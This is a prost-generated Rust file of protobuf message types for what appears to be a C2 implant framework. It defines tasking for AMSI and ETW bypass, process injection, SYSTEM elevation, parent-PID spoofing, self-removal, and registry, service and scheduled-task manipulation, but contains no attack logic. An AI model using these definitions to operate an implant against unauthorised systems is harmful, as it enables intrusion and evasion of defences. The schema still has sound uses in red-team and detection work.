// This file is @generated by prost-build.
#[derive(serde::Deserialize)]
#[derive(Clone, Copy, PartialEq, ::prost::Message)]
pub struct Ping {
    #[prost(int32, tag = "1")]
    #[serde(default)]
    pub nonce: i32,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Register {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub proxy: ::prost::alloc::string::String,
    #[prost(string, repeated, tag = "3")]
    #[serde(default)]
    pub module: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
    #[prost(message, repeated, tag = "4")]
    #[serde(default)]
    pub addons: ::prost::alloc::vec::Vec<Addon>,
    #[prost(message, optional, tag = "5")]
    #[serde(default)]
    pub timer: ::core::option::Option<Timer>,
    #[prost(message, optional, tag = "11")]
    #[serde(default)]
    pub sysinfo: ::core::option::Option<SysInfo>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Init {
    #[prost(bytes = "vec", tag = "1")]
    #[serde(default)]
    pub data: ::prost::alloc::vec::Vec<u8>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct SysInfo {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub filepath: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub workdir: ::prost::alloc::string::String,
    #[prost(bool, tag = "3")]
    #[serde(default)]
    pub is_privilege: bool,
    #[prost(message, optional, tag = "11")]
    #[serde(default)]
    pub os: ::core::option::Option<Os>,
    #[prost(message, optional, tag = "12")]
    #[serde(default)]
    pub process: ::core::option::Option<Process>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, Copy, PartialEq, ::prost::Message)]
pub struct Suicide {
    #[prost(int32, tag = "1")]
    #[serde(default)]
    pub r#type: i32,
    #[prost(int64, tag = "2")]
    #[serde(default)]
    pub timestamp: i64,
}
/// common empty request
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Request {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub input: ::prost::alloc::string::String,
    #[prost(string, repeated, tag = "3")]
    #[serde(default)]
    pub args: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
    #[prost(map = "string, string", tag = "4")]
    #[serde(default)]
    pub params: ::std::collections::HashMap<
        ::prost::alloc::string::String,
        ::prost::alloc::string::String,
    >,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Response {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub output: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub error: ::prost::alloc::string::String,
    #[prost(map = "string, string", tag = "3")]
    #[serde(default)]
    pub kv: ::std::collections::HashMap<
        ::prost::alloc::string::String,
        ::prost::alloc::string::String,
    >,
    #[prost(string, repeated, tag = "4")]
    #[serde(default)]
    pub array: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, Copy, PartialEq, ::prost::Message)]
pub struct BypassRequest {
    #[prost(bool, tag = "1")]
    #[serde(default)]
    pub etw: bool,
    #[prost(bool, tag = "2")]
    #[serde(default)]
    pub amsi: bool,
    #[prost(bool, tag = "3")]
    #[serde(default)]
    pub block_dll: bool,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct NetInterface {
    #[prost(int32, tag = "1")]
    #[serde(default)]
    pub index: i32,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    #[serde(default)]
    pub mac: ::prost::alloc::string::String,
    #[prost(string, repeated, tag = "4")]
    #[serde(default)]
    pub ip_addresses: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct SockTabEntry {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub local_addr: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub remote_addr: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    #[serde(default)]
    pub sk_state: ::prost::alloc::string::String,
    ///   uint32 uid = 4;
    #[prost(string, tag = "5")]
    #[serde(default)]
    pub pid: ::prost::alloc::string::String,
    #[prost(string, tag = "6")]
    #[serde(default)]
    pub protocol: ::prost::alloc::string::String,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct NetstatResponse {
    #[prost(message, repeated, tag = "1")]
    #[serde(default)]
    pub socks: ::prost::alloc::vec::Vec<SockTabEntry>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ImplantTask {
    #[prost(uint32, tag = "1")]
    #[serde(default)]
    pub task_id: u32,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub op: ::prost::alloc::string::String,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Block {
    #[prost(uint32, tag = "1")]
    #[serde(default)]
    pub block_id: u32,
    #[prost(bytes = "vec", tag = "2")]
    #[serde(default)]
    pub content: ::prost::alloc::vec::Vec<u8>,
    #[prost(bool, tag = "3")]
    #[serde(default)]
    pub end: bool,
}
#[derive(serde::Deserialize)]
#[derive(Clone, Copy, PartialEq, ::prost::Message)]
pub struct Ack {
    #[prost(uint32, tag = "1")]
    #[serde(default)]
    pub id: u32,
    #[prost(bool, tag = "2")]
    #[serde(default)]
    pub success: bool,
    #[prost(bool, tag = "3")]
    #[serde(default)]
    pub end: bool,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Os {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub name: ::prost::alloc::string::String,
    /// kernel version
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub version: ::prost::alloc::string::String,
    /// release version
    #[prost(string, tag = "3")]
    #[serde(default)]
    pub release: ::prost::alloc::string::String,
    #[prost(string, tag = "4")]
    #[serde(default)]
    pub arch: ::prost::alloc::string::String,
    #[prost(string, tag = "5")]
    #[serde(default)]
    pub username: ::prost::alloc::string::String,
    #[prost(string, tag = "6")]
    #[serde(default)]
    pub hostname: ::prost::alloc::string::String,
    /// timezone
    #[prost(string, tag = "7")]
    #[serde(default)]
    pub locale: ::prost::alloc::string::String,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Process {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub name: ::prost::alloc::string::String,
    #[prost(uint32, tag = "2")]
    #[serde(default)]
    pub pid: u32,
    #[prost(uint32, tag = "3")]
    #[serde(default)]
    pub ppid: u32,
    #[prost(string, tag = "4")]
    #[serde(default)]
    pub owner: ::prost::alloc::string::String,
    #[prost(string, tag = "5")]
    #[serde(default)]
    pub arch: ::prost::alloc::string::String,
    #[prost(string, tag = "6")]
    #[serde(default)]
    pub path: ::prost::alloc::string::String,
    #[prost(string, tag = "7")]
    #[serde(default)]
    pub args: ::prost::alloc::string::String,
    #[prost(string, tag = "8")]
    #[serde(default)]
    pub uid: ::prost::alloc::string::String,
}
#[derive(serde::Deserialize)]
#[derive(Clone, Copy, PartialEq, ::prost::Message)]
pub struct Timer {
    #[prost(uint64, tag = "1")]
    #[serde(default)]
    pub interval: u64,
    #[prost(double, tag = "2")]
    #[serde(default)]
    pub jitter: f64,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct FileInfo {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub name: ::prost::alloc::string::String,
    #[prost(bool, tag = "2")]
    #[serde(default)]
    pub is_dir: bool,
    #[prost(uint64, tag = "3")]
    #[serde(default)]
    pub size: u64,
    #[prost(int64, tag = "4")]
    #[serde(default)]
    pub mod_time: i64,
    #[prost(uint32, tag = "5")]
    #[serde(default)]
    pub mode: u32,
    #[prost(string, tag = "6")]
    #[serde(default)]
    pub link: ::prost::alloc::string::String,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct SacrificeProcess {
    #[prost(bool, tag = "1")]
    #[serde(default)]
    pub hidden: bool,
    #[prost(bool, tag = "2")]
    #[serde(default)]
    pub block_dll: bool,
    #[prost(bool, tag = "3")]
    #[serde(default)]
    pub etw: bool,
    #[prost(uint32, tag = "4")]
    #[serde(default)]
    pub ppid: u32,
    #[prost(string, tag = "5")]
    #[serde(default)]
    pub argue: ::prost::alloc::string::String,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct LsResponse {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub path: ::prost::alloc::string::String,
    #[prost(bool, tag = "2")]
    #[serde(default)]
    pub exists: bool,
    #[prost(message, repeated, tag = "3")]
    #[serde(default)]
    pub files: ::prost::alloc::vec::Vec<FileInfo>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct PsResponse {
    #[prost(message, repeated, tag = "1")]
    #[serde(default)]
    pub processes: ::prost::alloc::vec::Vec<Process>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ExecRequest {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub path: ::prost::alloc::string::String,
    #[prost(string, repeated, tag = "2")]
    #[serde(default)]
    pub args: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
    #[prost(bool, tag = "3")]
    #[serde(default)]
    pub output: bool,
    #[prost(uint32, tag = "10")]
    #[serde(default)]
    pub ppid: u32,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ExecResponse {
    #[prost(int32, tag = "1")]
    #[serde(default)]
    pub status_code: i32,
    #[prost(bytes = "vec", tag = "2")]
    #[serde(default)]
    pub stdout: ::prost::alloc::vec::Vec<u8>,
    #[prost(bytes = "vec", tag = "3")]
    #[serde(default)]
    pub stderr: ::prost::alloc::vec::Vec<u8>,
    #[prost(uint32, tag = "4")]
    #[serde(default)]
    pub pid: u32,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct BinaryResponse {
    /// common return, bof BeaconOutput
    #[prost(bytes = "vec", tag = "1")]
    #[serde(default)]
    pub data: ::prost::alloc::vec::Vec<u8>,
    /// bof BeaconPrintf
    #[prost(bytes = "vec", tag = "2")]
    #[serde(default)]
    pub message: ::prost::alloc::vec::Vec<u8>,
    #[prost(string, tag = "4")]
    #[serde(default)]
    pub err: ::prost::alloc::string::String,
    #[prost(int32, tag = "3")]
    #[serde(default)]
    pub status: i32,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Modules {
    #[prost(string, repeated, tag = "1")]
    #[serde(default)]
    pub modules: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Addons {
    #[prost(message, repeated, tag = "1")]
    #[serde(default)]
    pub addons: ::prost::alloc::vec::Vec<Addon>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Addon {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub r#type: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    #[serde(default)]
    pub depend: ::prost::alloc::string::String,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct LoadModule {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub bundle: ::prost::alloc::string::String,
    #[prost(bytes = "vec", tag = "2")]
    #[serde(default)]
    pub bin: ::prost::alloc::vec::Vec<u8>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct LoadAddon {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub r#type: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    #[serde(default)]
    pub depend: ::prost::alloc::string::String,
    #[prost(bytes = "vec", tag = "4")]
    #[serde(default)]
    pub bin: ::prost::alloc::vec::Vec<u8>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ExecuteAddon {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub addon: ::prost::alloc::string::String,
    #[prost(message, optional, tag = "2")]
    #[serde(default)]
    pub execute_binary: ::core::option::Option<ExecuteBinary>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ExecuteBinary {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub name: ::prost::alloc::string::String,
    #[prost(bytes = "vec", tag = "2")]
    #[serde(default)]
    pub bin: ::prost::alloc::vec::Vec<u8>,
    #[prost(map = "string, string", tag = "3")]
    #[serde(default)]
    pub param: ::std::collections::HashMap<
        ::prost::alloc::string::String,
        ::prost::alloc::string::String,
    >,
    #[prost(string, tag = "4")]
    #[serde(default)]
    pub r#type: ::prost::alloc::string::String,
    #[prost(string, tag = "5")]
    #[serde(default)]
    pub process_name: ::prost::alloc::string::String,
    #[prost(string, repeated, tag = "6")]
    #[serde(default)]
    pub args: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
    #[prost(string, tag = "7")]
    #[serde(default)]
    pub entry_point: ::prost::alloc::string::String,
    #[prost(bytes = "vec", tag = "8")]
    #[serde(default)]
    pub data: ::prost::alloc::vec::Vec<u8>,
    #[prost(bool, tag = "9")]
    #[serde(default)]
    pub output: bool,
    #[prost(uint32, tag = "10")]
    #[serde(default)]
    pub arch: u32,
    #[prost(uint32, tag = "11")]
    #[serde(default)]
    pub timeout: u32,
    #[prost(message, optional, tag = "12")]
    #[serde(default)]
    pub sacrifice: ::core::option::Option<SacrificeProcess>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ExecuteCommand {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub command: ::prost::alloc::string::String,
    #[prost(message, optional, tag = "2")]
    #[serde(default)]
    pub sacrifice: ::core::option::Option<SacrificeProcess>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct UploadRequest {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub target: ::prost::alloc::string::String,
    #[prost(uint32, tag = "3")]
    #[serde(default)]
    pub r#priv: u32,
    #[prost(bytes = "vec", tag = "4")]
    #[serde(default)]
    pub data: ::prost::alloc::vec::Vec<u8>,
    #[prost(bool, tag = "5")]
    #[serde(default)]
    pub hidden: bool,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct DownloadRequest {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub path: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub name: ::prost::alloc::string::String,
    #[prost(uint32, tag = "3")]
    #[serde(default)]
    pub buffer_size: u32,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct DownloadResponse {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub checksum: ::prost::alloc::string::String,
    #[prost(uint64, tag = "2")]
    #[serde(default)]
    pub size: u64,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct CurlRequest {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub url: ::prost::alloc::string::String,
    #[prost(int32, tag = "2")]
    #[serde(default)]
    pub timeout: i32,
    #[prost(string, tag = "3")]
    #[serde(default)]
    pub method: ::prost::alloc::string::String,
    #[prost(bytes = "vec", tag = "4")]
    #[serde(default)]
    pub body: ::prost::alloc::vec::Vec<u8>,
    #[prost(map = "string, string", tag = "5")]
    #[serde(default)]
    pub header: ::std::collections::HashMap<
        ::prost::alloc::string::String,
        ::prost::alloc::string::String,
    >,
    #[prost(string, tag = "6")]
    #[serde(default)]
    pub hostname: ::prost::alloc::string::String,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ChownRequest {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub path: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub uid: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    #[serde(default)]
    pub gid: ::prost::alloc::string::String,
    #[prost(bool, tag = "4")]
    #[serde(default)]
    pub recursive: bool,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct IfconfigResponse {
    #[prost(message, repeated, tag = "1")]
    #[serde(default)]
    pub net_interfaces: ::prost::alloc::vec::Vec<NetInterface>,
}
/// wrap for client
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct RegistryRequest {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub r#type: ::prost::alloc::string::String,
    #[prost(message, optional, tag = "2")]
    #[serde(default)]
    pub registry: ::core::option::Option<Registry>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Registry {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub hive: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub path: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    #[serde(default)]
    pub key: ::prost::alloc::string::String,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct RegistryWriteRequest {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub hive: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub path: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    #[serde(default)]
    pub key: ::prost::alloc::string::String,
    #[prost(string, tag = "5")]
    #[serde(default)]
    pub string_value: ::prost::alloc::string::String,
    #[prost(bytes = "vec", tag = "6")]
    #[serde(default)]
    pub byte_value: ::prost::alloc::vec::Vec<u8>,
    #[prost(uint32, tag = "7")]
    #[serde(default)]
    pub dword_value: u32,
    #[prost(uint64, tag = "8")]
    #[serde(default)]
    pub qword_value: u64,
    #[prost(uint32, tag = "10")]
    #[serde(default)]
    pub regtype: u32,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct TaskScheduleRequest {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub r#type: ::prost::alloc::string::String,
    #[prost(message, optional, tag = "2")]
    #[serde(default)]
    pub taskschd: ::core::option::Option<TaskSchedule>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct TaskSchedule {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub path: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    #[serde(default)]
    pub executable_path: ::prost::alloc::string::String,
    #[prost(uint32, tag = "4")]
    #[serde(default)]
    pub trigger_type: u32,
    #[prost(string, tag = "5")]
    #[serde(default)]
    pub start_boundary: ::prost::alloc::string::String,
    #[prost(string, tag = "6")]
    #[serde(default)]
    pub description: ::prost::alloc::string::String,
    #[prost(bool, tag = "7")]
    #[serde(default)]
    pub enabled: bool,
    #[prost(string, tag = "8")]
    #[serde(default)]
    pub last_run_time: ::prost::alloc::string::String,
    #[prost(string, tag = "9")]
    #[serde(default)]
    pub next_run_time: ::prost::alloc::string::String,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct TaskSchedulesResponse {
    #[prost(message, repeated, tag = "1")]
    #[serde(default)]
    pub schedules: ::prost::alloc::vec::Vec<TaskSchedule>,
}
/// wrap for client
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ServiceRequest {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub r#type: ::prost::alloc::string::String,
    #[prost(message, optional, tag = "2")]
    #[serde(default)]
    pub service: ::core::option::Option<ServiceConfig>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ServiceConfig {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub display_name: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    #[serde(default)]
    pub executable_path: ::prost::alloc::string::String,
    #[prost(uint32, tag = "4")]
    #[serde(default)]
    pub start_type: u32,
    #[prost(uint32, tag = "5")]
    #[serde(default)]
    pub error_control: u32,
    #[prost(string, tag = "6")]
    #[serde(default)]
    pub account_name: ::prost::alloc::string::String,
}
#[derive(serde::Deserialize)]
#[derive(Clone, Copy, PartialEq, ::prost::Message)]
pub struct ServiceStatus {
    #[prost(uint32, tag = "1")]
    #[serde(default)]
    pub current_state: u32,
    #[prost(uint32, tag = "2")]
    #[serde(default)]
    pub process_id: u32,
    #[prost(uint32, tag = "3")]
    #[serde(default)]
    pub exit_code: u32,
    #[prost(uint32, tag = "4")]
    #[serde(default)]
    pub checkpoint: u32,
    #[prost(uint32, tag = "5")]
    #[serde(default)]
    pub wait_hint: u32,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Service {
    #[prost(message, optional, tag = "1")]
    #[serde(default)]
    pub config: ::core::option::Option<ServiceConfig>,
    #[prost(message, optional, tag = "2")]
    #[serde(default)]
    pub status: ::core::option::Option<ServiceStatus>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct ServicesResponse {
    #[prost(message, repeated, tag = "1")]
    #[serde(default)]
    pub services: ::prost::alloc::vec::Vec<Service>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct WmiQueryRequest {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub namespace: ::prost::alloc::string::String,
    #[prost(string, repeated, tag = "2")]
    #[serde(default)]
    pub args: ::prost::alloc::vec::Vec<::prost::alloc::string::String>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct WmiMethodRequest {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub namespace: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub class_name: ::prost::alloc::string::String,
    #[prost(string, tag = "3")]
    #[serde(default)]
    pub method_name: ::prost::alloc::string::String,
    #[prost(map = "string, string", tag = "4")]
    #[serde(default)]
    pub params: ::std::collections::HashMap<
        ::prost::alloc::string::String,
        ::prost::alloc::string::String,
    >,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct RunAsRequest {
    /// 需要执行的用户名
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub username: ::prost::alloc::string::String,
    /// 用户所属域
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub domain: ::prost::alloc::string::String,
    /// 用户密码
    #[prost(string, tag = "3")]
    #[serde(default)]
    pub password: ::prost::alloc::string::String,
    /// 程序路径
    #[prost(string, tag = "4")]
    #[serde(default)]
    pub program: ::prost::alloc::string::String,
    /// 程序参数（可选）
    #[prost(string, tag = "5")]
    #[serde(default)]
    pub args: ::prost::alloc::string::String,
    /// 窗口展示方式 (1: 默认显示)
    #[prost(int32, tag = "6")]
    #[serde(default)]
    pub show: i32,
    /// 是否仅使用网络凭据 (可选，默认 false)
    #[prost(bool, tag = "7")]
    #[serde(default)]
    pub netonly: bool,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct GetSystem {
    #[prost(bytes = "vec", tag = "1")]
    #[serde(default)]
    pub bin: ::prost::alloc::vec::Vec<u8>,
    #[prost(uint32, tag = "2")]
    #[serde(default)]
    pub pid: u32,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Inject {
    #[prost(bytes = "vec", tag = "1")]
    #[serde(default)]
    pub bin: ::prost::alloc::vec::Vec<u8>,
    #[prost(uint32, tag = "2")]
    #[serde(default)]
    pub pid: u32,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Pipe {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub name: ::prost::alloc::string::String,
    #[prost(string, tag = "2")]
    #[serde(default)]
    pub target: ::prost::alloc::string::String,
    #[prost(bytes = "vec", tag = "4")]
    #[serde(default)]
    pub data: ::prost::alloc::vec::Vec<u8>,
}
#[derive(serde::Deserialize)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct PipeRequest {
    #[prost(string, tag = "1")]
    #[serde(default)]
    pub r#type: ::prost::alloc::string::String,
    #[prost(message, optional, tag = "2")]
    #[serde(default)]
    pub pipe: ::core::option::Option<Pipe>,
}
